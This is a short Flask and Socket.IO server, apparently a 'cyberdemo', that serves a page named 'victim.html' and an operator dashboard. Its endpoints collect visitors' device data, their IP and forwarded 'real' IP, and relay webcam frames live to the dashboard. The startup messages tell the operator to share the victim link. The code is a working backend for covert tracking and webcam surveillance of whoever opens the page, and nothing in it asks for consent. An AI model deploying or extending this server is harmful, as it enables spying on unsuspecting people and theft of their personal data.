from flask import Flask, render_template, request, jsonify
from flask_socketio import SocketIO, emit
from datetime import datetime
import json

app = Flask(__name__)
app.config['SECRET_KEY'] = 'cyberdemo-secret-2026'
socketio = SocketIO(app, cors_allowed_origins="*", async_mode='threading')

#Store collected device data in memory

collected_data = []

@app.route('/')

def index():
    
    return render_template('victim.html')

@app.route('/dashboard')

def dashboard():
    
    return render_template('dashboard.html')

@app.route('/api/collect', methods=['POST'])

def collect():
    
    data = request.get_json()
    data['timestamp'] = datetime.now().strftime('%H:%M:%S')
    data['ip'] = request.remote_addr
    data['real_ip'] = request.headers.get('X-Forwarded-For', request.remote_addr)
    collected_data.append(data)

    #Broadcast to dashboard in real-time

    socketio.emit('new_data', data)
    return jsonify({'status': 'ok'})

@app.route('/api/data')

def get_data():
    return jsonify(collected_data)

@socketio.on('webcam_frame')

def handle_webcam_frame(data):
    
    emit('webcam_frame', data, broadcast=True)

@socketio.on('connect')

def handle_connect():
    print(f'[+] Client connected: {request.sid}')

if __name__ == '__main__':
    
    print("Victim page -> http://<YOUR-IP>:5000/")
    
    print("Dashboard -> http://<YOUR-IP>:5000/dashboard")
  
    socketio.run(app, host='0.0.0.0', port=5000, debug=False)